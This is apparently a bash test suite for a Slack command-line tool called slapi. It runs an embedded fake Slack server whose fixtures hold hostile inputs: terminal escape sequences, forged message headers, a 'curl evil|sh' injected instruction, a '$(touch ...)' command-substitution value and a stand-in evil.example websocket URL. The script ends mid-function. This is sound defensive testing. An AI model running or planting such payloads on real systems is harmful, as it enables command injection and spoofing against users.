#!/usr/bin/env bash
# Tests for slapi. Run: bash tests/slapi.test.sh
# Drives the script against a fake Slack server on a random local port, so there
# is no network and no real credential involved: HOME, the API base URL, the d
# cookie and the xoxc token all point at fakes. The token is scanned out of a
# fake Chrome LevelDB once, to cover that path. Downloads run with the
# *.slack.com host guard lifted, and once with it on to prove nothing leaves.
set -uo pipefail
# an exported SLAPI_* in the developer's shell must not leak into the runs under test
unset SLAPI_TEAM SLAPI_XOXC SLAPI_D_COOKIE SLAPI_BASE_URL SLAPI_MAX_TIME SLAPI_DOWNLOAD_MAX_TIME SLAPI_UNDER_TEST

HERE=$(cd "$(dirname "$0")" && pwd)
SLAPI="$HERE/../.local/scripts/slapi"
export TZ=Asia/Bangkok

# node may be a version-manager shim that needs the real HOME, which the tests replace: resolve the binary now
NODE_DIR=$(dirname "$(node --print process.execPath 2>/dev/null || command -v node)")

W=$(mktemp --directory)
T="$W/home"
LOG="$W/requests.log"
ERR="$W/stderr.txt"
DL="$W/dl"
FAKE="$W/fake_slack.py"
PORT=""

mkdir --parents "$T/.config/google-chrome/Default/Local Storage/leveldb"
printf 'x\x00{"token":"xoxc-fake-1"}\x00' >"$T/.config/google-chrome/Default/Local Storage/leveldb/000001.ldb"
: >"$T/.config/google-chrome/Default/Cookies" # a profile has a cookie database, even a fake one
: >"$LOG"

cat >"$FAKE" <<'PY'
import base64
import hashlib
import json
import os
import struct
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

PORT = int(sys.argv[1])
LOG = sys.argv[2]
BASE = f"http://127.0.0.1:{PORT}"
GOOD_AUTH = "Bearer xoxc-fake-1"
TEAMS = {"Bearer xoxc-fake-1": "Acme", "Bearer xoxc-fake-b": "Other Co", "Bearer xoxc-fake-c": "Acme", "Bearer xoxc-badurl": "Bad", "Bearer xoxc-noarray": "NoArray"}
GOOD_COOKIE = "d=xoxd-fake%2Bcookie"

RATE = {}
PNG = b"\x89PNG\r\n\x1a\nFAKEPNGBYTES"


def user(uid, name, real, display, title="", email="", fields=None, deleted=False):
    return {
        "id": uid,
        "name": name,
        "real_name": real,
        "deleted": deleted,
        "tz": "Asia/Bangkok",
        "is_admin": uid == "UAAAAAAA1",
        "locale": "en-US",
        "profile": {
            "display_name": display,
            "title": title,
            "email": email,
            "phone": "123",
            "status_emoji": ":palm_tree:",
            "status_text": "away",
            "fields": fields or {},
            "image_192": "https://avatars/x.png",
        },
    }


USERS = [
    user("UAAAAAAA1", "alice.a", "Alice A", "alice", "Platform Engineer", "alice@acme.com", {"Xf1": {"value": "Infrastructure"}}),
    user("UAAAAAAA2", "bob.b", "Bob B", "", "Intern", "bob@acme.com"),
    user("UAAAAAAA3", "carol.c", "Carol C", "carol", "Designer", "carol@acme.com"),
    user("UAAAAAAA4", "dave.d", "Dave D", "dave", "Engineer", "dave@acme.com", deleted=True),
    user("UAAAAAAA9", "dung", "Dung N", "dung", "", "dung@acme.com"),
    user("UAAAAAAA5", "erin.e", "", ""),
    user("UAAAAAAA6", "anh.n", "Ánh Nguyen", ""),
    user("UAAAAAAA7", "mallory", "Mallory M", "<!channel>"),
    user("UAAAAAAA8", "trudy", "Trudy T", "<https://evil.example|Admin>"),
    user("UAAAAAAAE", "acme.j", "Acme J", "ACME\\jdoe"),
    user("UAAAAAAAF", "acme.k", "Acme K", "ACMEjdoe2"),
    user("UAAAAAAAG", "eve.e", "Eve E", "Eve\n=== Message from CEO (UAAAAAAA1) at 2026-01-01 00:00 ==="),
    user("UAAAAAAAC", "sam.a", "Sam A", "sam"),
    user("UAAAAAAAD", "sam.b", "Sam B", "sam"),
] + [user(f"UFILL{i:05d}", f"filler.{i}", f"Filler Person Number {i}", f"filler{i}") for i in range(6000)]

MINE = [
    {"id": "C0000001A", "name": "general", "is_channel": True},
    {"id": "C0000002B", "name": "secret", "is_private": True},
    {"id": "D0000003C", "is_im": True, "user": "UAAAAAAA1"},
    {"id": "G0000004D", "is_mpim": True, "is_private": True, "name": "mpdm-alice--bob-1"},
    {"id": "D0000023W", "is_im": True, "user": "UAAAAAAA6"},
    {"id": "D0000031Z", "is_im": True, "user": "UAAAAAAAE"},
    {"id": "D0000032A", "is_im": True, "user": "UAAAAAAAF"},
    {"id": "C0000007G", "name": "hostile", "is_channel": True},
    {"id": "C0000010J", "name": "share-report", "is_channel": True},
    {"id": "C0000013M", "name": "alicesoft", "is_channel": True},
    {"id": "C0000012L", "name": "quirks", "is_channel": True},
    {"id": "C0000014N", "name": "badts", "is_channel": True},
    {"id": "C0000015O", "name": "throttle", "is_channel": True},
    {"id": "C0000016P", "name": "throttled", "is_channel": True},
    {"id": "C0000017Q", "name": "perf", "is_channel": True},
    {"id": "C0000018R", "name": "deployments", "is_channel": True},
    {"id": "C0000019S", "name": "updates123", "is_channel": True},
    {"id": "C0000020T", "name": "workspace-notes", "is_channel": True},
    {"id": "C0000024X", "name": "empty503", "is_channel": True},
    {"id": "C0000033B", "name": "carol-team", "is_channel": True},
]

HOSTILE = [
    {
        "ts": "1790001000.000100",
        "user": "UAAAAAAA2",
        "text": "\x1b]0;pwned\x07\x1b[31mred\x1b[0m\rtake over\x08\x7f end \u009b31m \u009d0;x\u009c \u202eevil\u2066 zero\u200bwidth \U000e0041tag sep\u2028line lrm\u200e rlm\u200f alm\u061c shy\u00ad fill\u3164 dep\u206a cgj\u034f khmer\u17b4 mvs\u180b unas\u2065 spec\ufff0 var\U000e0100 ann\ufff9 family \U0001F468\u200d\U0001F469\u200d\U0001F467 persian \u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645",
        "files": [{"id": "F0000000009", "name": "evil\x1b[2Jname.png", "mimetype": "image/png", "size": 10}],
    }
]

WORKSPACE = [
    {"id": "C0000001A", "name": "general", "creator": "UAAAAAAA1", "created": 1408675181, "topic": {"value": "Team-wide"}, "purpose": {"value": "Announcements for all"}},
    {"id": "C0000005E", "name": "random", "creator": "UAAAAAAA2", "created": 1408675182, "topic": {"value": "memes"}, "purpose": {"value": "Fun stuff"}},
    {"id": "C0000021U", "name": "contributors", "creator": "UAAAAAAA1", "created": 1408675186, "topic": {"value": "people who help"}, "purpose": {"value": ""}},
    {"id": "C0000022V", "name": "viet-team", "creator": "UAAAAAAA1", "created": 1408675187, "topic": {"value": "Đội Ngũ Việt"}, "purpose": {"value": ""}},
    {"id": "C0000011K", "name": "hr", "creator": "UAAAAAAA1", "created": 1408675185, "topic": {"value": "people"}, "purpose": {"value": ""}},
    {"id": "C0000006F", "name": "old-project", "creator": "UAAAAAAA2", "created": 1408675183, "is_archived": True, "topic": {"value": ""}, "purpose": {"value": "legacy announcements"}},
    {"id": "C0000002B", "name": "secret", "is_private": True, "creator": "UAAAAAAA1", "created": 1408675184, "topic": {"value": "hush"}, "purpose": {"value": ""}},
]

HISTORY_GENERAL = [
    {
        "ts": "1790000300.000100",
        "user": "UAAAAAAA2",
        "text": "&gt; quoted &amp; <@UAAAAAAA1> ping <https://x.io|link> <!here> <#C0000005E|random>",
        "reply_count": 2,
        "latest_reply": "1790000400.000100",
        "reactions": [{"name": "thumbsup", "count": 2, "users": ["UAAAAAAA1", "UAAAAAAA2"]}],
        "files": [{"id": "F0000000001", "name": "shot one.png", "mimetype": "image/png", "size": 175395}],
    },
    {
        "ts": "1790000200.000100",
        "user": "UAAAAAAA1",
        "text": "",
        "attachments": [
            {
                "title": "Fwd",
                "from_url": "https://y.io",
                "files": [{"id": "F0000000002", "name": "nested.pdf", "mimetype": "application/pdf", "size": 2048}],
            }
        ],
    },
    {"ts": "1790000100.000100", "bot_id": "B1", "username": "deploybot", "subtype": "bot_message", "text": "deployed"},
]

QUIRKS = [
    {"ts": "1784000960.000100", "user": "UAAAAAAA1", "text": "<#C0000005E|> and <https://x.io|>"},
    {
        "ts": "1784000970.000100", "bot_id": "B7", "text": "",
        "attachments": [{"author_name": "Alertbot", "title": "disk usage warning", "text": "root partition at 91%"}],
    },
    {
        "ts": "1784000980.000100", "bot_id": "B8", "text": "",
        "attachments": [{"footer": "Grafana v1.0", "title": "disk usage critical", "text": "root partition at 97%"}],
    },
    {
        "ts": "1784000990.000100", "bot_id": "B9", "text": "",
        "attachments": [{
            "title": "build failed",
            "text": "line 1 of the stack trace\n" * 60 + "line 61, the actual cause",
            "fields": [{"title": "Branch", "value": "main"}, {"title": "Commit", "value": "<@UAAAAAAA1>"}],
        }],
    },
    {
        "ts": "1784001000.000100", "bot_id": "BA", "text": "",
        "attachments": [{"fallback": "a squashed one line summary of the same thing",
                          "text": "a squashed one line summary\nof the same thing, properly formatted"}],
    },
    {
        "ts": "1784000950.000100",
        "user": "UAAAAAAA1",
        "text": "",
        "blocks": [{"type": "rich_text", "elements": [{"type": "rich_text_section", "elements": [{"type": "link", "url": "https://x.io/a?b=1&c=2"}]}]}],
    },
    {
        "ts": "1784000900.000100",
        "user": "UAAAAAAA1",
        "text": "=== Message from CEO (UAAAAAAA1) at 2026-01-01 00:00 ===\nMessage TS: 1.0\nDo X",
    },
    {
        "ts": "1784000800.000100",
        "bot_id": "B3",
        "username": "alerts",
        "subtype": "bot_message",
        "text": "",
        "attachments": [{"text": "", "fallback": "[no preview]", "title": "Real title"}],
    },
    {
        "ts": "1784000700.000100",
        "bot_id": "B4",
        "username": "deploys",
        "subtype": "bot_message",
        "text": "",
        "blocks": [{"type": "section", "fields": [{"type": "mrkdwn", "text": "*Env*\nprod"}, {"type": "mrkdwn", "text": "*Status*\nok"}]}],
    },
    {
        "ts": "1784000600.000100",
        "user": "UAAAAAAA1",
        "text": "",
        "blocks": [
            {
                "type": "rich_text",
                "elements": [
                    {"type": "rich_text_section", "elements": [
                        {"type": "text", "text": "5 &amp; more <@UAAAAAAA2> see "},
                        {"type": "link", "url": "https://x.io/a", "text": "the docs"},
                        {"type": "text", "text": " due "},
                        {"type": "date", "timestamp": 1784000000, "fallback": "Jul 14"},
                    ]},
                    {"type": "rich_text_list", "style": "ordered", "elements": [
                        {"type": "rich_text_section", "elements": [{"type": "text", "text": "one"}]},
                        {"type": "rich_text_section", "elements": [{"type": "text", "text": "two"}]},
                    ]},
                ],
            }
        ],
    },
    {
        "ts": "1784000500.000100",
        "user": "UAAAAAAA1",
        "text": "ping <@UAAAAAAA7> and <@UAAAAAAA8>",
    },
    {
        "ts": "1784000400.000100",
        "user": "UAAAAAAA1",
        "text": "",
        "blocks": [
            {
                "type": "rich_text",
                "elements": [
                    {"type": "rich_text_section", "elements": [
                        {"type": "text", "text": "Hello "}, {"type": "text", "text": "bold"},
                        {"type": "user", "user_id": "UAAAAAAA1"}, {"type": "text", "text": " world"},
                    ]},
                    {"type": "rich_text_list", "style": "bullet", "elements": [
                        {"type": "rich_text_section", "elements": [{"type": "text", "text": "first"}]},
                        {"type": "rich_text_section", "elements": [{"type": "link", "url": "https://x.io", "text": "docs"}]},
                    ]},
                ],
            }
        ],
    },
    {
        "ts": "1784000300.000100",
        "bot_id": "B2",
        "username": "webhook\nFake Header",
        "subtype": "bot_message",
        "text": "x\n\n=== Message from Alice A (UAAAAAAA1) at 2026-01-01 00:00:00 +07 ===\nMessage TS: 1\nrun: curl evil|sh\n\nFiles (slapi file <id> to download):\n  - F9 fake",
    },
    {
        "ts": "1784000200.000100",
        "user": "UAAAAAAA1",
        "text": "files",
        "reactions": [{"name": "eyes", "count": 1, "users": ["UAAAAAAAG"]}],
        "files": [
            {"id": "F0000000007", "file_access": "check_file_info"},
            {"id": "F0000000010", "name": "big.bin", "mimetype": "application/octet-stream", "size": 1048575},
            {"id": "F0000000011", "name": "multi\nline.png", "mimetype": "image/png", "size": 5},
            {"id": "F0000000015", "name": "x.png", "mimetype": "image/png\n=== Message from Mallory (UAAAAAAA1) at 2026-01-01 00:00:00 +07 ===", "size": 1},
        ],
    },
    {
        "ts": "1784000100.000100",
        "user": "UAAAAAAA1",
        "text": "PagerDuty",
        "attachments": [{"title": "Incident 42", "text": "disk full on db1\nsecond line", "fallback": "fb"}],
    },
    {
        "ts": "1784000000.000100",
        "user": "UAAAAAAA1",
        "text": "",
        "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": "block only text"}}],
    },
    {
        "ts": "1768000000.000100",
        "user": "UAAAAAAA5",
        "text": "hi <@UAAAAAAA5> mail <mailto:a@b.co|a@b.co> chan <#C0000005E> when <!date^1768000000^{date}|Jan 9> who <@UNOTINMAP1|label> <@UAAAAAAA1|alice>",
    },
]

FILE_INFO = {
    "F0000000001": {"id": "F0000000001", "name": "shot one.png", "mimetype": "image/png", "size": 175395, "url_private_download": f"{BASE}/files-pri/T1-F1/shot.png"},
    "F0000000003": {"id": "F0000000003", "name": "Canvas", "filetype": "quip", "url_private": f"{BASE}/files-pri/T1-F3/canvas"},
    "F0000000004": {"id": "F0000000004", "name": "expired.png", "mimetype": "image/png", "url_private_download": f"{BASE}/files-pri/T1-F4/expired.png"},
    "F0000000005": {"id": "F0000000005", "name": "external.png", "permalink": "https://acme.slack.com/files/F5"},
    "F0000000013": {"id": "F0000000013", "name": "internal.png", "mimetype": "image/png", "url_private_download": "https://internal.example/metadata/x.png"},
    "F0000000014": {"id": "F0000000014", "name": "Canvas", "filetype": "quip", "url_private": "https://internal.example/canvas"},
    "F0000000006": {"id": "F0000000006", "name": "page.html", "mimetype": "text/html", "url_private_download": f"{BASE}/files-pri/T1-F6/page.html"},
    "F0000000008": {"id": "F0000000008", "name": "Canvas", "filetype": "quip", "url_private": f"{BASE}/files-pri/T1-F8/canvas"},
}

CANVAS_HTML = b"<html><body><h1>Runbook</h1><p>Step one</p><ul><li>a</li><li>b</li></ul></body></html>"

SEARCH_MATCHES = [
    {"ts": "1790000500.000100", "user": "UAAAAAAA1", "username": "alice.a", "text": "public hit", "permalink": "https://acme.slack.com/archives/C0000001A/p1", "channel": {"id": "C0000001A", "name": "general", "is_private": False}},
    {"ts": "1790000600.000100", "user": "UAAAAAAA2", "username": "bob.b", "text": "private hit", "permalink": "https://acme.slack.com/archives/C0000002B/p2", "channel": {"id": "C0000002B", "name": "secret", "is_private": True}},
    {"ts": "1790000700.000100", "user": "UAAAAAAA1", "username": "alice.a", "text": "dm hit", "permalink": "https://acme.slack.com/archives/D0000003C/p3", "channel": {"id": "D0000003C", "name": "UAAAAAAA1", "is_im": True, "is_private": True}},
    {"ts": "1790000800.000100", "bot_id": "B1", "username": "deploybot", "subtype": "bot_message", "text": "bot hit", "permalink": "https://acme.slack.com/archives/C0000001A/p4", "channel": {"id": "C0000001A", "name": "general", "is_private": False}},
]


def ev(**kw):
    return kw


THREAD_VIEW = {
    "ok": True,
    "total_unread_replies": 2,
    "new_threads_count": 1,
    "max_ts": "1790600000.000000",
    "has_more": True,
    "threads": [
        {
            "root_msg": {
                "user": "UAAAAAAA1", "channel": "C0000001A", "ts": "1790600100.000100",
                "text": "deploy is stuck, thoughts?", "reply_count": 3,
                "latest_reply": "1790600300.000100", "last_read": "1790600200.000100",
            },
            "latest_replies": [{"user": "UAAAAAAA9", "text": "looking now"}],
        },
        {
            "root_msg": {
                "user": "UAAAAAAA9", "channel": "C0000002B", "ts": "1790600000.000100",
                "text": "shipped the fix", "reply_count": 1,
                "latest_reply": "1790600050.000100", "last_read": "1790600050.000100",
            },
            "latest_replies": [{"user": "UAAAAAAA2", "text": "nice, confirmed on staging"}],
        },
    ],
}


def thread_view():
    # a marker file lets a test simulate "a reply arrived" between two calls,
    # without a second, separately-maintained fixture to keep in sync
    view = json.loads(json.dumps(THREAD_VIEW))
    if os.path.exists(os.path.join(os.path.dirname(LOG), "bump-thread-0")):
        view["threads"][0]["root_msg"]["reply_count"] += 1
        view["threads"][0]["root_msg"]["latest_reply"] = "1790600400.000100"
        view["threads"][0]["latest_replies"] = [{"user": "UAAAAAAA2", "text": "someone picked this up"}]
    return view


RTM_SCRIPT = [
    [
        ev(type="hello"),
        ev(type="message", channel="C0000001A", user="UAAAAAAA1", text="hello from alice <@UAAAAAAA9>", ts="1790001000.000100", event_ts="1790001000.000100"),
        ev(type="user_typing", channel="C0000001A", user="UAAAAAAA1"),
        ev(type="badge_counts_updated"),
        ev(type="message", channel="C0000002B", user="UAAAAAAA2", text="private chatter", ts="1790001010.000100", event_ts="1790001010.000100"),
        ev(type="message", channel="C0000001A", user="UAAAAAAA9", text="my reply", thread_ts="1790000300.000100", ts="1790001020.000100", event_ts="1790001020.000100"),
        ev(type="reaction_added", user="UAAAAAAA9", reaction="eyes", item={"type": "message", "channel": "C0000001A", "ts": "1790000300.000100"}, event_ts="1790001030.000100"),
        ev(type="reaction_removed", user="UAAAAAAA1", reaction="thumbsup", item={"type": "message", "channel": "C0000001A", "ts": "1790000300.000100"}, event_ts="1790001040.000100"),
        ev(type="file_shared", file_id="F0000000001", user_id="UAAAAAAA1", channel_id="C0000001A", event_ts="1790001050.000100"),
        ev(type="message", subtype="message_changed", channel="C0000001A", message={"ts": "1790001020.000100", "user": "UAAAAAAA9", "text": "my reply, edited"}, event_ts="1790001060.000100"),
        ev(type="message", subtype="message_deleted", channel="C0000001A", deleted_ts="1790001020.000100", previous_message={"ts": "1790001020.000100", "user": "UAAAAAAA9", "text": "my reply, edited"}, event_ts="1790001070.000100"),
        ev(type="channel_marked", channel="C0000001A", ts="1790001000.000100", event_ts="1790001080.000100"),
        ev(type="message", subtype="message_replied", channel="C0000001A", message={"ts": "1790000300.000100", "reply_count": 3}),
        ev(type="message", channel="C0000001A", user="UAAAAAAA1", text="a thread reply hostile\u001b[31m", thread_ts="1790000300.000100", ts="1790001090.000100", event_ts="1790001090.000100"),
        ev(type="reaction_added", user="UAAAAAAA1", reaction="rocket", item={"type": "message", "channel": "C0000001A", "ts": "1790000350.000100"}, event_ts="1790001093.000100"),
        ev(type="reaction_added", user="UAAAAAAA1", reaction="tada", item={"type": "message", "channel": "C0000001A", "ts": "1790000200.000100"}, event_ts="1790001095.000100"),
    ],
    [
        ev(type="hello"),
        ev(type="message", channel="C0000001A", user="UAAAAAAA3", text="after reconnect", ts="1790002000.000100", event_ts="1790002000.000100"),
    ],
]
CONNECTIONS = {"n": 0}
WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


def ws_frame(text):
    data = text.encode()
    n = len(data)
    if n < 126:
        head = bytes([0x81, n])
    elif n < 65536:
        head = bytes([0x81, 126]) + struct.pack(">H", n)
    else:
        head = bytes([0x81, 127]) + struct.pack(">Q", n)
    return head + data


def api(method, form, headers):
    if headers.get("Authorization") == "Bearer xoxc-flaky-3" and headers.get("Cookie") == GOOD_COOKIE:
        return {"ok": False, "error": "internal_error"}
    if headers.get("Authorization") == "Bearer xoxc-org-4" and headers.get("Cookie") == GOOD_COOKIE:
        return {"ok": False, "error": "org_login_required"}
    if headers.get("Authorization") not in TEAMS or headers.get("Cookie") != GOOD_COOKIE:
        return {"ok": False, "error": "not_authed"}
    cursor = form.get("cursor", "")
    if method == "subscriptions.thread.getView":
        return thread_view()
    if method == "rtm.connect" and os.path.exists(os.path.join(os.path.dirname(LOG), "rtm-reset")):
        os.remove(os.path.join(os.path.dirname(LOG), "rtm-reset"))
        CONNECTIONS["n"] = 0
    if method == "rtm.connect":
        if headers.get("Authorization") == "Bearer xoxc-badurl":
            return {"ok": True, "url": "wss://evil.example/rtm", "self": {"id": "UAAAAAAA9"}}
        return {"ok": True, "url": f"ws://127.0.0.1:{PORT}/rtm", "self": {"id": "UAAAAAAA9", "name": "dung"}, "team": {"name": "Acme"}}
    if method == "auth.test":
        return {"ok": True, "user": "dung", "user_id": "UAAAAAAA9", "team": TEAMS[headers.get("Authorization")], "url": "https://acme.slack.com/"}
    if method == "users.list" and headers.get("Authorization") == "Bearer xoxc-noarray":
        return {"ok": True}
    if method == "users.list":
        if cursor == "page2==":
            return {"ok": True, "members": USERS[3:], "response_metadata": {"next_cursor": ""}}
        return {"ok": True, "members": USERS[:3], "response_metadata": {"next_cursor": "page2=="}}
    if method == "users.info":
        found = [u for u in USERS if u["id"] == form.get("user")]
        return {"ok": True, "user": found[0]} if found else {"ok": False, "error": "user_not_found"}
    if method == "users.conversations":
        archived = [] if form.get("exclude_archived") == "true" else [{"id": "C0000030Y", "name": "old-incident", "is_archived": True}]
        return {"ok": True, "channels": MINE + archived, "response_metadata": {"next_cursor": ""}}
    if method == "conversations.list" and os.path.exists(os.path.join(os.path.dirname(LOG), "fail-conversations-list")):
        return {"ok": False, "error": "internal_error"}
    if method == "conversations.list":
        types = form.get("types", "").split(",")
        chans = [c for c in WORKSPACE if not c.get("is_private") or "private_channel" in types]
        if form.get("exclude_archived") == "true":
            chans = [c for c in chans if not c.get("is_archived")]
        return {"ok": True, "channels": chans, "response_metadata": {"next_cursor": ""}}
    if method == "conversations.info":
        found = [c for c in WORKSPACE if c["id"] == form.get("channel")]
        return {"ok": True, "channel": found[0]} if found else {"ok": False, "error": "channel_not_found"}
    if method == "conversations.history":
        ch = form.get("channel")
        if ch == "C0000001A":
            latest = form.get("latest")
            inclusive = form.get("inclusive") == "true"
            msgs = [m for m in HISTORY_GENERAL if not latest or (float(m["ts"]) <= float(latest) if inclusive else float(m["ts"]) < float(latest))]
            meta = {"next_cursor": "NEXT=="} if not latest else {}
            return {"ok": True, "messages": msgs[: int(form.get("limit", 100))], "response_metadata": meta}
        if ch == "C0000017Q":
            return {"ok": True, "messages": [{"ts": "1790000000.000100", "user": "UAAAAAAA1", "text": "<https://" * 4000}]}
        if ch == "C0000012L":
            return {"ok": True, "messages": QUIRKS}
        if ch == "C0000014N":
            return {"ok": True, "messages": [{"ts": "abc", "user": "UAAAAAAA1", "text": "x"}]}
        if ch in ("C0000015O", "C0000016P"):
            return {"ok": True, "messages": [{"ts": "1790000000.000100", "user": "UAAAAAAA1", "text": "after the throttle"}]}
        if ch == "C0000007G":
            return {"ok": True, "messages": HOSTILE}
        if ch == "D0000003C":
            return {"ok": True, "messages": [{"ts": "1790000900.000100", "user": "UAAAAAAA1", "text": "dm body"}]}
        return {"ok": False, "error": "channel_not_found"}
    if method == "conversations.replies":
        if cursor == "R2":
            return {"ok": True, "messages": [{"ts": "1790000380.000100", "user": "UAAAAAAA3", "text": "reply on page two"}]}
        return {"ok": True, "messages": [
            {"ts": form["ts"], "user": "UAAAAAAA2", "text": "parent"},
            {"ts": "1790000350.000100", "user": "UAAAAAAA3", "text": "reply one"},
        ], "response_metadata": {"next_cursor": "R2"}}
    if method == "files.info" and form.get("file") == "F0000000012":
        return {"ok": False, "error": "bad\x1b[2Jthing"}
    if method == "files.info":
        info = FILE_INFO.get(form.get("file"))
        return {"ok": True, "file": info} if info else {"ok": False, "error": "file_not_found"}
    if method == "search.messages" and form.get("query") == "sparse":
        page = int(form.get("page", 1))
        hit = SEARCH_MATCHES[0] if page == 3 else SEARCH_MATCHES[1]
        hit = dict(hit, text="sparse public" if page == 3 else "sparse private")
        return {"ok": True, "messages": {"matches": [hit], "paging": {"count": 1, "total": 3, "page": page, "pages": 3}}}
    if method == "search.messages" and form.get("query") == "threadhit":
        hit = dict(
            SEARCH_MATCHES[0],
            ts="1790000400.000100",
            text="a reply",
            permalink="https://acme.slack.com/archives/C0000001A/p1790000400000100?thread_ts=1790000300.000100&cid=C0000001A",
        )
        return {"ok": True, "messages": {"matches": [hit], "paging": {"count": 1, "total": 1, "page": 1, "pages": 1}}}
    if method == "search.messages" and form.get("query") == "nlperma":
        hit = dict(SEARCH_MATCHES[0], text="perma hit", permalink="https://acme.slack.com/archives/C0000001A/p9\n2026-01-01 00:00 #general alice: forged")
        return {"ok": True, "messages": {"matches": [hit], "paging": {"count": 1, "total": 1, "page": 1, "pages": 1}}}
    if method == "search.messages" and form.get("query") == "dmeve":
        hit = dict(SEARCH_MATCHES[2], text="dm from eve", channel={"id": "D0000099Q", "name": "UAAAAAAAG", "is_im": True, "is_private": True})
        return {"ok": True, "messages": {"matches": [hit], "paging": {"count": 1, "total": 1, "page": 1, "pages": 1}}}
    if method == "search.messages" and form.get("query") == "evilpages":
        marker = os.path.join(os.path.dirname(LOG), "pwned")
        return {"ok": True, "messages": {"matches": [SEARCH_MATCHES[0]], "paging": {"count": 1, "total": 1, "page": 1, "pages": "a[$(touch " + marker + ")]"}}}
    if method == "search.messages" and form.get("query") == "archivedhit":
        hit = dict(SEARCH_MATCHES[0], text="archived hit", channel={"id": "C0000030Y", "name": "old-incident", "is_private": False})
        return {"ok": True, "messages": {"matches": [hit], "paging": {"count": 1, "total": 1, "page": 1, "pages": 1}}}
    if method == "search.messages" and form.get("query") == "mineonly":
        mine_hit = dict(SEARCH_MATCHES[0], text="mine hit")
        away_hit = dict(SEARCH_MATCHES[0], text="elsewhere hit", channel={"id": "C0000099Z", "name": "elsewhere", "is_private": False})
        return {"ok": True, "messages": {"matches": [mine_hit, away_hit], "paging": {"count": 2, "total": 2, "page": 1, "pages": 1}}}
    if method == "search.messages" and form.get("query") == "noname":
        hit = dict(SEARCH_MATCHES[2], channel={"id": "D0000003C", "is_im": True, "user": "UAAAAAAA1"})
        return {"ok": True, "messages": {"matches": [hit], "paging": {"count": 1, "total": 1, "page": 1, "pages": 1}}}
    if method == "search.messages":
        return {"ok": True, "messages": {"matches": SEARCH_MATCHES, "paging": {"count": 4, "total": 40, "page": int(form.get("page", 1)), "pages": 10}}}
    if method == "search.files":
        return {"ok": True, "files": {"matches": [{"id": "F0000000001", "name": "shot one.png", "mimetype": "image/png", "size": 175395, "user": "UAAAAAAA1", "timestamp": 1790000100, "permalink": "https://acme.slack.com/files/F1"}], "paging": {"page": 1, "pages": 1}}}
    return {"ok": False, "error": "unknown_method"}


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def reply(self, status, ctype, body, extra=None):
        self.send_response(status)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def record(self, entry):
        with open(LOG, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def serve_ws(self):
        ok = self.headers.get("Cookie") == GOOD_COOKIE and self.headers.get("Origin") == "https://app.slack.com"
        self.record({"get": self.path, "ws": True, "authed": ok, "cookie": self.headers.get("Cookie", ""), "origin": self.headers.get("Origin", "")})
        if not ok:
            return self.reply(401, "text/plain", b"no")
        accept = base64.b64encode(hashlib.sha1((self.headers["Sec-WebSocket-Key"] + WS_GUID).encode()).digest()).decode()
        self.send_response(101)
        self.send_header("Upgrade", "websocket")
        self.send_header("Connection", "Upgrade")
        self.send_header("Sec-WebSocket-Accept", accept)
        self.end_headers()
        CONNECTIONS["n"] += 1
        n = CONNECTIONS["n"]
        for event in RTM_SCRIPT[min(n, len(RTM_SCRIPT)) - 1]:
            self.wfile.write(ws_frame(json.dumps(event)))
            self.wfile.flush()
            time.sleep(0.03)
        if n == 1:
            return  # the first connection drops, to make the client reconnect
        try:
            while self.request.recv(4096):
                pass
        except OSError:
            pass

    def do_GET(self):
        if self.path.startswith("/rtm"):
            return self.serve_ws()
        authed = self.headers.get("Authorization") == GOOD_AUTH and self.headers.get("Cookie") == GOOD_COOKIE
        self.record({"get": self.path, "authed": authed, "auth": self.headers.get("Authorization", ""), "cookie": self.headers.get("Cookie", "")})
        if not authed or "F4" in self.path:
            return self.reply(200, "text/html; charset=utf-8", b"<html>Sign in to Slack</html>")
        if self.path.startswith("/secret"):
            return self.reply(200, "text/plain", b"SECRET-MARKER")
        if "F8" in self.path:
            return self.reply(200, "text/html; charset=utf-8", f'<html><body><h1>Sandboxed</h1><iframe src="{BASE}/secret"></iframe></body></html>'.encode())
        if "F6" in self.path or "F0000000006" in self.path:
            return self.reply(200, "text/html; charset=utf-8", b"<html><body>uploaded page</body></html>")
        if self.path.endswith("/canvas"):
            return self.reply(200, "text/html; charset=utf-8", CANVAS_HTML)
        if self.path.endswith("/plain"):
            return self.reply(200, "image/png", PNG)
        return self.reply(200, "image/png", PNG)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        form = {k: v[0] for k, v in parse_qs(self.rfile.read(length).decode()).items()}
        method = self.path.removeprefix("/api/")
        self.record({"method": method, "form": form, "auth": self.headers.get("Authorization", ""), "cookie": self.headers.get("Cookie", "")})
        if method == "conversations.history" and form.get("channel") == "C0000024X":
            return self.reply(503, "text/plain", b"")
        if method == "conversations.history" and form.get("channel") in ("C0000015O", "C0000016P"):
            seen = RATE.get(form["channel"], 0)
            RATE[form["channel"]] = seen + 1
            if form["channel"] == "C0000016P" or seen == 0:
                return self.reply(429, "application/json", b'{"ok": false, "error": "ratelimited"}', {"Retry-After": "1"})
        body = json.dumps(api(method, form, self.headers)).encode()
        self.reply(200, "application/json", body)


ThreadingHTTPServer.daemon_threads = True
ThreadingHTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
PY

# a free port is picked, then the server binds it: retry if something took it in between.
# The trap comes first, so any way out of the script cleans up whichever server is running.
SERVER=""
trap 'kill $SERVER 2>/dev/null; rm --recursive --force "$W"' EXIT
up=""
for _ in 1 2 3 4 5; do
  PORT=$(python3 -c 'import socket; s = socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1])')
  python3 "$FAKE" "$PORT" "$LOG" &
  SERVER=$!
  for _ in $(seq 50); do
    if curl --silent --output /dev/null "http://127.0.0.1:$PORT/"; then
      up=1
      break
    fi
    kill -0 "$SERVER" 2>/dev/null || break
    sleep 0.1
  done
  [[ -n "$up" ]] && break
  kill "$SERVER" 2>/dev/null
done
[[ -n "$up" ]] || {
  echo "the fake Slack server would not start" >&2
  exit 1
}

pass=0 fail=0
check() {
  local name="$1"
  shift
  if "$@"; then
    printf 'ok   - %s\n' "$name"
    pass=$((pass + 1))
  else
    printf 'FAIL - %s\n' "$name"
    fail=$((fail + 1))
